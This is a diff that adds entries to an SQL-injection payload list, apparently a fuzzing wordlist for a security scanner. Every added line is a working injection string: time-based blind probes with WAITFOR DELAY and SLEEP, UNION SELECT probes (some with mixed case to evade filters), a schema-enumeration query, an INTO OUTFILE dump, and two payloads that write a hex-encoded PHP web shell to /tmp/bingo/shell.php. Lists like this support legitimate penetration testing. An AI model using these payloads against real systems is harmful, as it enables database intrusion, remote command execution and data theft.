@@ -67,3 +67,19 @@ RANDOMBLOB(1000000000/2)
 sleep(1)--
 sleep(1)#
 x' or 1=1 or 'x'='y
+'));waitfor delay '0:0:1'--
+');waitfor delay '0:0:1'--
+';WAITFOR DELAY '0:0:1'--
+';waitfor delay '0:0:1'--
+1;waitfor delay '0:0:1'
+NULL;waitfor delay '0:0:1'
+@@VERSION;waitfor delay '0:0:1'
+-1' UNION SELECT 1,2,3,4-- x
+1 UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e, null, null, null INTO DUMPFILE '/tmp/bingo/shell.php';
+1 UNION SELECT 1,2,3,0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/tmp/bingo/shell.php';
+1 union select 1,2,3,4
+1 UniOn Select NULL,NULL,'B',gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata
+1 UNION SELECT SLEEP(1),@@VERSION,USER(),NULL
+1 uNIoN(sEleCT 1,2,3,4)
+["1807192982')) union select 1,2,3,4#"]
+1 || 1 = 1 into outfile '/tmp/bingo/result.txt'
